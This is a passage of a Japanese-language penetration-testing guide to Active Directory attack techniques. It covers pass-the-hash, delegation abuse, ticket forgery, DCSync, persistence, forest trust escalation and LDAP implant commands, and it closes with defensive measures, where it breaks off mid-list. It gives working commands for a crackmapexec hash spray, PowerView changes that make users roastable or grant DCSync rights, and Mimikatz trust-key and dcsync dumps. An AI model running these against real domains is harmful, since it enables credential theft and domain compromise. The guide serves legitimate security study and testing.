../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

この脆弱性により、認証済みのユーザーは誰でも**ドメインコントローラーを侵害**できました。


{{#ref}}
printnightmare.md
{{#endref}}

## 特権のある認証情報／セッションを使ったActive Directoryの権限昇格

**以下の手法を実行するには、一般的なドメインユーザーでは不十分です。これらの攻撃には、特別な権限または認証情報が必要です。**

### ハッシュの抽出

[AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（relayを含む）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[ローカルでの権限昇格](../windows-local-privilege-escalation/index.html)を使って、**ローカル管理者アカウントを侵害**できているとよいでしょう。\
次に、メモリ内とローカルにあるすべてのハッシュをダンプします。\
[**ハッシュを取得するさまざまな方法については、このページを参照してください。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**ユーザーのハッシュを入手したら**、それを使ってユーザーに**なりすます**ことができます。\
そのハッシュを使って**NTLM認証を実行する****ツール**を使うか、新しい**sessionlogon**を作成して、その**ハッシュ**を**LSASS**に**注入**します。そうすると、**NTLM認証が実行されるたびに、そのハッシュが使用されます。**後者の方法をmimikatzが使用します。\
[**詳しくはこのページを参照してください。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

この攻撃では、一般的なNTLMプロトコルでのPass The Hashの代わりに、**ユーザーのNTLMハッシュを使ってKerberosチケットを要求**します。そのため、NTLMプロトコルが無効で、認証プロトコルとして**Kerberosのみが許可されている**ネットワークで特に**有用**です。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket（PTT）**攻撃では、攻撃者はパスワードやハッシュ値ではなく、**ユーザーの認証チケットを盗みます**。盗んだチケットを使って**ユーザーになりすまし**、ネットワーク内のリソースやサービスに不正にアクセスします。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### 認証情報の再利用

**ローカル管理者**の**ハッシュ**または**パスワード**を持っている場合、それを使って他の**PC**に**ローカルログイン**できるか試してください。

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> かなり**ノイジー**であり、**LAPS**によってこれを**緩和**できる点に注意してください。

### MSSQLの悪用と信頼されたリンク

ユーザーが**MSSQLインスタンスへのアクセス**権限を持っている場合、MSSQLホスト上で**コマンドを実行**したり（SAとして実行されている場合）、NetNTLM **ハッシュを窃取**したり、**リレー攻撃**を実行したりできる可能性があります。\
あるMSSQLインスタンスが別のインスタンスからデータベースリンクを介して信頼されている場合、リンク先データベースに対する権限を持つユーザーは、**その信頼関係を利用してもう一方のインスタンスでクエリを実行**できる可能性があります。こうした信頼関係は連鎖させることができ、最終的にユーザーがコマンドを実行できる設定不備のあるデータベースにたどり着く場合があります。\
**データベース間のリンクは、フォレストの信頼関係を越えても機能します。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT資産管理／デプロイメントプラットフォームの悪用

サードパーティ製のインベントリ管理・デプロイメントスイートは、多くの場合、認証情報へのアクセスやコード実行につながる強力な経路を提供します。以下を参照してください。

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### 制約のない委任

コンピューターオブジェクトに属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) が設定されており、そのコンピューターに対するドメイン権限を持っている場合、そのコンピューターにログインするすべてのユーザーのTGTをメモリからダンプできます。\
そのため、**Domain Adminがそのコンピューターにログイン**すると、そのTGTをダンプし、[Pass the Ticket](pass-the-ticket.md)を使ってなりすますことができます。\
制約付き委任を利用すれば、**Print Serverを自動的に侵害**することさえ可能です（それがDCであれば理想的です）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### 制約付き委任

ユーザーまたはコンピューターが「制約付き委任」を許可されている場合、**コンピューター上の特定のサービスにアクセスするために、任意のユーザーになりすます**ことができます。\
したがって、このユーザー／コンピューターの**ハッシュを侵害**すれば、（Domain Adminを含む）**任意のユーザーになりすまして**特定のサービスにアクセスできます。


{{#ref}}
constrained-delegation.md
{{#endref}}

### リソースベースの制約付き委任

リモートコンピューターのActive Directoryオブジェクトに対する**WRITE**権限があれば、**高い権限**でコードを実行できるようになります。


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 権限／ACLの悪用

侵害したユーザーが、ドメイン内のオブジェクトに対して**興味深い権限**を持っている場合、それを利用して横方向に**移動**したり、権限を**昇格**したりできる可能性があります。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spoolerサービスの悪用

ドメイン内で**リッスン中のSpoolサービス**を見つければ、それを**悪用**して**新たな認証情報を取得**し、**権限を昇格**できる可能性があります。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### サードパーティのセッションの悪用

**侵害した**マシンに**他のユーザーがアクセス**している場合、**メモリから認証情報を収集**したり、そのプロセスにビーコンを**インジェクト**してユーザーになりすましたりできる可能性があります。\
通常、ユーザーはRDP経由でシステムにアクセスします。以下では、サードパーティのRDPセッションに対して実行できる攻撃をいくつか紹介します。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**は、ドメイン参加コンピューターの**ローカルAdministratorパスワード**を管理する仕組みです。パスワードが**ランダム化**され、一意で、定期的に**変更**されるようにします。これらのパスワードはActive Directoryに保存され、アクセスはACLによって許可されたユーザーのみに制限されます。これらのパスワードにアクセスする十分な権限があれば、他のコンピューターへピボットできるようになります。


{{#ref}}
laps.md
{{#endref}}

### 証明書の窃取

侵害したマシンから**証明書を収集**することで、環境内の権限を昇格できる場合があります。


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### 証明書テンプレートの悪用

**脆弱なテンプレート**が設定されている場合、それを悪用して権限を昇格できる可能性があります。


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 高い権限を持つアカウントでの侵害後活動

### ドメイン認証情報のダンプ

**Domain Admin**、またはさらに高い**Enterprise Admin**権限を取得したら、**ドメインデータベース**（_ntds.dit_）を**ダンプ**できます。

[**DCSync attackの詳細はこちら**](dcsync.md)。

[**NTDS.ditの窃取方法の詳細はこちら**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

`ntds.dit`と`SYSTEM`ハイブを含む、読み取り可能なバックアップアーカイブは、展開前であってもディレクトリ情報の漏えいとして扱う必要があります。古いパスワードハッシュがあっても、他のオブジェクト属性が安全とは限りません。`description`などのフィールドに認証情報や運用メモが含まれていることがあります。まずアーカイブ内のメンバー名を確認し、展開したデータベースの内容が通常の列挙結果に出力されないようにしてください。

### 永続化のための権限昇格

前述した手法の一部は、永続化にも利用できます。\
たとえば、次のことができます。

- ユーザーを[**Kerberoast**](kerberoast.md)に対して脆弱な状態にする

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- ユーザーを[**ASREPRoast**](asreproast.md)に対して脆弱にする

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- ユーザーに [**DCSync**](#dcsync) 権限を付与する

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack**は、**NTLM hash**（たとえば、**PC accountのhash**）を使って、特定のサービス向けの**正規のTicket Granting Service (TGS) ticket**を作成します。この手法は、**サービスの権限にアクセスする**ために使用されます。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**では、Active Directory (AD) 環境の**krbtgt accountのNTLM hash**を攻撃者が入手します。このアカウントは、ADネットワーク内での認証に不可欠なすべての**Ticket Granting Ticket (TGT)**への署名に使われるため、特別なアカウントです。

攻撃者はこのhashを入手すると、任意のアカウントの**TGT**を作成できます（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

一般的なgolden ticketの検出メカニズムを**回避する方法で偽造されたgolden ticket**です。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**アカウントの証明書を持っている、または証明書を要求できること**は、ユーザーがパスワードを変更した後でも、そのアカウントで永続化する非常に有効な方法です。


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**証明書を使って、ドメイン内で高い権限を維持することも可能です。**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directoryの**AdminSDHolder**オブジェクトは、**Domain Admins**や**Enterprise Admins**などの**特権グループ**に標準の**Access Control List (ACL)**を適用し、不正な変更を防ぐことで、これらのグループのセキュリティを確保します。しかし、この機能は悪用される可能性があります。攻撃者がAdminSDHolderのACLを変更し、一般ユーザーにフルアクセス権を与えると、そのユーザーはすべての特権グループを広範に制御できるようになります。このように、保護を目的としたセキュリティ対策が、厳重に監視されていない場合には、意図しないアクセスを許す結果になることがあります。

[**AdminDSHolder Groupの詳細はこちら。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての**Domain Controller (DC)**には、**local administrator**アカウントが存在します。このようなマシンで管理者権限を取得すると、**mimikatz**を使ってローカルAdministratorのhashを抽出できます。その後、このパスワードの使用を**有効にする**ためにレジストリを変更すると、ローカルAdministratorアカウントにリモートアクセスできるようになります。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

ユーザーに特定のドメインオブジェクトに対する**特別な権限を付与**することで、そのユーザーが**将来、権限昇格できる**ようにできます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptor**は、ある**オブジェクト**が別の**オブジェクト**に対して持つ**権限**を**保存する**ために使われます。オブジェクトの**security descriptor**を**少し変更する**だけで、特権グループに所属せずとも、そのオブジェクトに対する非常に興味深い権限を取得できます。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary classを悪用し、`entryTTL`/`msDS-Entry-Time-To-Die`を設定した短命のprincipal/GPO/DNS recordを作成します。これらはtombstoneを残さずに自動削除され、孤立したSID、壊れた`gPLink`参照、キャッシュされたDNS応答（例: AdminSDHolder ACEの汚染や、悪意ある`gPCFileSysPath`/AD-integrated DNS redirect）を残しながら、LDAPの証拠を消去します。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

メモリ内の**LSASS**を改変して**共通パスワード**を設定し、すべてのドメインアカウントへのアクセスを可能にします。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider)とは何か、こちらで確認してください。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
マシンへのアクセスに使われる**credentials**を**平文で取得**するために、**独自のSSP**を作成できます。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

ADに**新しいDomain Controller**を登録し、それを使って、**変更に関するログを一切残さずに**指定したオブジェクトの属性（SIDHistory、SPNなど）を**プッシュ**します。**DA**権限が必要で、**root domain**内にいる必要があります。\
誤ったデータを使うと、かなり目立つログが記録されることに注意してください。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

これまで、**LAPS passwordを読み取るのに十分な権限**がある場合に、どのように権限昇格できるかを説明しました。しかし、これらのパスワードは**永続化の維持**にも利用できます。\
こちらを確認してください:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoftは**Forest**をセキュリティ境界とみなしています。つまり、**単一のドメインが侵害されると、Forest全体が侵害される可能性がある**ということです。<sup>[[1]](#references)</sup>

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)は、ある**domain**のユーザーが別の**domain**のリソースにアクセスできるようにするセキュリティメカニズムです。これは基本的に、2つのドメインの認証システムをつなぎ、認証検証がシームレスに行われるようにします。ドメイン間でtrustを設定すると、両ドメインはtrustの整合性を保つために不可欠な特定の**key**を交換し、それぞれの**Domain Controller (DC)**に保持します。

一般的なケースでは、ユーザーが**trusted domain**内のサービスにアクセスする際、まず自分のドメインのDCに**inter-realm TGT**と呼ばれる特別なticketを要求する必要があります。このTGTは、両ドメインが合意した共有**key**で暗号化されています。次に、ユーザーはこのTGTを**trusted domainのDC**に提示し、service ticket (**TGS**)を取得します。trusted domainのDCがinter-realm TGTを正常に検証すると、TGSを発行し、ユーザーにサービスへのアクセスを許可します。

**手順**:

1. **Domain 1**内の**client computer**は、自身の**NTLM hash**を使って、**Domain Controller (DC1)**に**Ticket Granting Ticket (TGT)**を要求し、処理を開始します。
2. クライアントの認証に成功すると、DC1は新しいTGTを発行します。
3. 次にクライアントは、**Domain 2**のリソースにアクセスするために必要な**inter-realm TGT**をDC1に要求します。
4. inter-realm TGTは、双方向のdomain trustの一環としてDC1とDC2が共有する**trust key**で暗号化されています。
5. クライアントはinter-realm TGTを**Domain 2のDomain Controller (DC2)**に渡します。
6. DC2は共有trust keyを使ってinter-realm TGTを検証し、有効であれば、クライアントがアクセスしようとしているDomain 2内のサーバー向けに**Ticket Granting Service (TGS)**を発行します。
7. 最後にクライアントはこのTGSをサーバーに提示します。TGSはサーバーのアカウントhashで暗号化されており、これによりDomain 2のサービスにアクセスできます。

### Different trusts

**trustには一方向と双方向がある**ことに注意してください。双方向の場合、両方のドメインが互いを信頼します。一方、**一方向**のtrust関係では、一方のドメインが**trusted**、もう一方が**trusting**になります。後者の場合、**trusted domainからtrusting domain内のリソースにのみアクセスできます**。

Domain AがDomain Bを信頼している場合、Aがtrusting domain、Bがtrusted domainです。また、**Domain A**では**Outbound trust**、**Domain B**では**Inbound trust**になります。

**trust関係の種類**

- **Parent-Child Trusts**: 同一Forest内でよく使われる構成で、child domainはparent domainとの間に自動的に双方向のtransitive trustを持ちます。つまり、認証要求はparentとchildの間をシームレスに行き来できます。
- **Cross-link Trusts**: 「shortcut trusts」とも呼ばれ、referral処理を高速化するためにchild domain間に設定されます。複雑なForestでは、認証referralは通常、Forest rootまで上がってから対象のdomainに下りていく必要があります。cross-linkを作成すると経路が短縮されるため、地理的に分散した環境で特に有用です。
- **External Trusts**: 相互に関連のない異なるdomain間に設定され、性質上non-transitiveです。[Microsoftのドキュメント](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)によると、external trustは、Forest trustで接続されていない別のForest内のdomainのリソースにアクセスする場合に役立ちます。external trustでは、SID filteringによってセキュリティが強化されます。
- **Tree-root Trusts**: Forest root domainと、新たに追加されたtree rootとの間に自動的に設定されるtrustです。あまり一般的ではありませんが、新しいdomain treeをForestに追加する際に重要で、固有のdomain名を維持しながら双方向のtransitivityを実現できます。詳しくは[Microsoftのガイド](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)を参照してください。
- **Forest Trusts**: 2つのForest root domain間の双方向transitive trustで、セキュリティ強化のためSID filteringも適用されます。
- **MIT Trusts**: Windows以外の[RFC4120準拠](https://tools.ietf.org/html/rfc4120)のKerberos domainとの間に設定されるtrustです。MIT trustはやや特殊で、Windowsエコシステム外のKerberosベースのシステムとの統合が必要な環境向けです。

#### **trust関係**に関するその他の違い

- trust関係は**transitive**（AがBを信頼し、BがCを信頼する場合、AもCを信頼する）にも、**non-transitive**にも設定できます。
- trust関係は**bidirectional trust**（双方が互いを信頼する）にも、**one-way trust**（一方のみが他方を信頼する）にも設定できます。

### Attack Path

1. trust関係を**列挙**する
2. **security principal**（user/group/computer）が、ACEエントリや他方のdomainのグループへの所属などを通じて、**他方のdomain**のリソースに**アクセス**できるか確認する。**domain間の関係**を探す（おそらく、それを目的にtrustが作成されています）。
   1. この場合、kerberoastも別の選択肢になる可能性があります。
3. domain間を**pivot**できる**アカウント**を**侵害**する。

攻撃者は、主に次の3つの仕組みを通じて、別のdomain内のリソースにアクセスできます。

- **Local Group Membership**: principalが、サーバーの「Administrators」グループなど、マシン上のローカルグループに追加されている場合、そのマシンを強力に制御できます。
- **Foreign Domain Group Membership**: principalはforeign domain内のグループのメンバーになることもできます。ただし、この方法の有効性はtrustの種類とグループのスコープによって異なります。
- **Access Control Lists (ACLs)**: principalが**ACL**、特に**DACL**内の**ACE**に指定され、特定のリソースへのアクセス権を持っている場合があります。ACL、DACL、ACEの仕組みを詳しく知りたい場合は、ホワイトペーパー「[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)」が非常に役立ちます。<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**を確認すると、domain内のforeign security principalを見つけられます。これらは**外部domain/Forest**のuser/groupです。

**Bloodhound**またはpowerviewを使って確認できます。

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

ドメインの信頼関係を列挙するその他の方法：

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> 信頼されたキーは**2つ**あり、1つは _子 --> 親_ 用、もう1つは _親_ --> _子_ 用です。\
> 現在のドメインで使用されているキーは、次のコマンドで確認できます:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injectionを悪用し、Enterprise adminとして子ドメイン／親ドメインに昇格します。


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 書き込み可能な Configuration NC の悪用

Configuration Naming Context (NC) がどのように悪用されるかを理解することは重要です。Configuration NCは、Active Directory (AD) 環境のフォレスト全体にわたる構成データの中央リポジトリとして機能します。このデータはフォレスト内のすべての Domain Controller (DC) に複製され、書き込み可能なDCはConfiguration NCの書き込み可能なコピーを保持します。これを悪用するには、**DC上でSYSTEM権限**を持っている必要があります。できれば子DCが望ましいです。

**GPOをルートDCサイトにリンクする**

Configuration NCのSitesコンテナには、ADフォレスト内のドメイン参加済みコンピューターすべてのサイト情報が含まれています。任意のDC上でSYSTEM権限を使うことで、攻撃者はGPOをルートDCサイトにリンクできます。この操作により、これらのサイトに適用されるポリシーを操作し、ルートドメインを侵害できる可能性があります。

詳しくは、[Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)に関する調査を参照してください。<sup>[[12]](#references)</sup>

**フォレスト内の任意のgMSAを侵害する**

攻撃経路の1つは、ドメイン内の特権を持つgMSAを標的にすることです。gMSAのパスワード計算に不可欠なKDS Root keyは、Configuration NCに保存されています。任意のDC上でSYSTEM権限を持っていれば、KDS Root keyにアクセスし、フォレスト内の任意のgMSAのパスワードを計算できます。

詳細な分析と手順については、以下を参照してください。


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

補完的な委任MSA攻撃（BadSuccessor – migration attributesの悪用）:


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

追加の外部調査: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)。<sup>[[13]](#references)</sup>

**Schema変更攻撃**

この手法では、新たな特権ADオブジェクトが作成されるまで待つ必要があり、時間がかかります。SYSTEM権限があれば、攻撃者はAD Schemaを変更し、任意のユーザーにすべてのクラスへの完全な制御権を付与できます。これにより、新たに作成されたADオブジェクトへの不正アクセスや制御につながる可能性があります。

詳しくは、[Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)を参照してください。<sup>[[14]](#references)</sup>

**ADCS ESC5を使ってDAからEAへ**

ADCS ESC5の脆弱性は、Public Key Infrastructure (PKI) オブジェクトへの制御権を標的とし、フォレスト内の任意のユーザーとして認証できる証明書テンプレートを作成します。PKIオブジェクトはConfiguration NCにあるため、書き込み可能な子DCを侵害すると、ESC5攻撃を実行できます。

詳細は[From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)を参照してください。<sup>[[15]](#references)</sup> ADCSが存在しない場合でも、攻撃者は必要なコンポーネントをセットアップできます。詳細は[Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)で解説されています。<sup>[[16]](#references)</sup>

### 外部フォレストドメイン - 一方向（インバウンド）または双方向

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

このシナリオでは、外部ドメインがあなたのドメインを信頼しており、外部ドメインに対する未確定の権限が与えられています。あなたのドメインのどのプリンシパルが外部ドメインに対してどのアクセス権を持つかを特定し、それを悪用してみてください。


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部フォレストドメイン - 一方向（Outbound）

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

このシナリオでは、**あなたのドメイン**が、**別のドメイン**のプリンシパルに**一部の権限を信頼して委ねている**状態です。

しかし、あるドメインが信頼元ドメインから**信頼される**と、信頼されるドメインは、**予測可能な名前**のユーザーを作成し、**信頼パスワード**をそのパスワードとして使用します。つまり、信頼元ドメインのユーザーに**アクセスして信頼されるドメインに侵入**し、そのドメインを列挙して、さらに権限昇格を試みることが可能です。


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

信頼されるドメインを侵害するもう1つの方法は、ドメインの信頼関係と**逆方向**に作成された[**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)を見つけることです（これはあまり一般的ではありません）。

信頼されるドメインを侵害するもう1つの方法は、**信頼されるドメインのユーザーがアクセスして**、**RDP**でログインできるマシン上で待機することです。その後、攻撃者はRDPセッションのプロセスにコードをインジェクトし、そこから**被害者の所属するドメインにアクセス**できます。\
さらに、**被害者がハードドライブをマウントしていた**場合、攻撃者は**RDPセッション**のプロセスから、そのハードドライブの**スタートアップフォルダー**に**バックドア**を保存できます。この手法は**RDPInception**と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### ドメイン信頼関係の悪用に対する緩和策

### **SID Filtering:**

- フォレスト間の信頼関係を通じてSID history属性を悪用する攻撃のリスクは、SID Filteringによって緩和されます。これは、Microsoftの見解に基づき、セキュリティ境界をドメインではなくフォレストとみなし、フォレスト内の信頼関係は安全であると想定しているため、すべてのフォレスト間信頼関係でデフォルトで有効になっています。
- ただし注意点があります。SID filteringはアプリケーションやユーザーアクセスに支障をきたすことがあり、そのため無効化される場合があります。

### **Selective Authentication:**

- フォレスト間の信頼関係では、Selective Authenticationを使用すると、2つのフォレストのユーザーが自動的に認証されないようにできます。代わりに、信頼元のドメインまたはフォレスト内のドメインやサーバーにユーザーがアクセスするには、明示的な権限が必要です。
- これらの対策では、書き込み可能なConfiguration Naming Context (NC)の悪用や、信頼アカウントへの攻撃を防げない点に注意してください。

[**ired.teamのドメイン信頼関係に関する詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## オンホストインプラントからのLDAPベースのAD悪用

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection)は、bloodyAD形式のLDAPプリミティブを、オンホストインプラント（例: Adaptix C2）内で完全に実行されるx64 Beacon Object Filesとして再実装しています。オペレーターは`git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`でパックをコンパイルし、`ldap.axs`をロードした後、ビーコンから`ldap <subcommand>`を実行します。すべての通信は、現在のログオンセキュリティコンテキストを使用して、署名または暗号化を行うLDAP (389)、もしくは証明書を自動的に信頼するLDAPS (636)経由で行われるため、socksプロキシやディスク上のアーティファクトは不要です。<sup>[[4]](#references)</sup>

### インプラント側でのLDAP列挙

- `get-users`、`get-computers`、`get-groups`、`get-usergroups`、`get-groupmembers`は、短い名前やOUパスを完全なDNに解決し、対応するオブジェクトをダンプします。
- `get-object`、`get-attribute`、`get-domaininfo`は、任意の属性（セキュリティ記述子を含む）に加え、`rootDSE`からフォレストおよびドメインのメタデータを取得します。
- `get-uac`、`get-spn`、`get-delegation`、`get-rbcd`は、roasting候補、委任設定、および既存の[Resource-based Constrained Delegation](resource-based-constrained-delegation.md)記述子をLDAPから直接確認できます。
- `get-acl`と`get-writable --detailed`はDACLを解析し、信頼主体、権限（GenericAll/WriteDACL/WriteOwner/属性への書き込み）、継承を一覧表示するため、ACLによる権限昇格の標的をすぐに特定できます。

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### escalation と persistence のための LDAP write primitive

- Object creation BOF（`add-user`、`add-computer`、`add-group`、`add-ou`）を使うと、OU の権限がある場所に新しい principal や machine account を用意できます。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute` は、write-property 権限が見つかった対象を直接乗っ取ります。
- ACL に重点を置いたコマンド（`add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync`）を使うと、任意の AD object に対する WriteDACL/WriteOwner を、パスワードリセット、グループメンバーシップの制御、DCSync レプリケーション権限に変換できます。PowerShell/ADSI の痕跡は残りません。`remove-*` 系のコマンドを使えば、追加した ACE をクリーンアップできます。

### Delegation、roasting、Kerberos の悪用

- `add-spn`/`set-spn` を使うと、侵害したユーザーをすぐに Kerberoast の対象にできます。`add-asreproastable`（UAC の切り替え）を使うと、パスワードに触れることなく AS-REP roasting の対象にできます。
- Delegation macro（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）は、beacon から `msDS-AllowedToDelegateTo`、UAC flag、`msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換えます。これにより、constrained/unconstrained/RBCD の攻撃経路が可能になり、remote PowerShell や RSAT が不要になります。

### sidHistory の注入、OU の移動、攻撃対象領域の調整

- `add-sidhistory` は、制御下の principal の SID history に特権 SID を注入します（[SID-History Injection](sid-history-injection.md) を参照）。LDAP/LDAPS 経由のみで、ステルス性の高いアクセス権の継承を実現できます。
- `move-object` は、computer や user の DN/OU を変更します。攻撃者は、`set-password`、`add-groupmember`、`add-spn` を悪用する前に、権限委任済みの OU へ対象資産を移動できます。
- 対象を厳密に絞った削除コマンド（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` など）を使えば、認証情報や persistence を取得した後にすばやくロールバックでき、telemetry を最小限に抑えられます。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般的な防御策

[**認証情報を保護する方法について詳しくはこちら。**](../stealing-credentials/credentials-protections.md)

### **認証情報を保護するための防御策**

- **Domain Admins の制限**: Domain Admins のログイン先は Domain Controller のみに限定し、他のホストでは使用しないことを推奨します。
- **Service Account の権限**: セキュリティを維持するため、Domain Admin（DA）権限でサービスを実行しないでください。
- **特権の一時的な制限**: DA 権限が必要なタスクでは、その権限を使用する時間を制限してください。次のように設定できます: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay の緩和**: Event ID 2889/3074/3075 を監査した後、DC/クライアントで LDAP signing と LDAPS channel binding を強制し、LDAP MITM/relay を阻止してください。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket の動作をプロトコルレベルでフィンガープリントする

一般的な AD tradecraft を検知する場合、名前を変更した binary、service name、一時的な batch file、output path など、**攻撃者が制御できる痕跡だけに頼らないでください**。正規の Windows client が[Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC、WMI の traffic をどのように生成するかをベースライン化し、攻撃者が `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py`、`ntlmrelayx.py` を編集した後にも残る**実装上の癖**を探してください。<sup>[[8]](#references)</sup>

- **単独でも高い信頼度が見込める候補**（自環境のベースラインとの照合後）:
  - `auth_context_id = 79231 + ctx_id` を使う、認証済み DCE/RPC
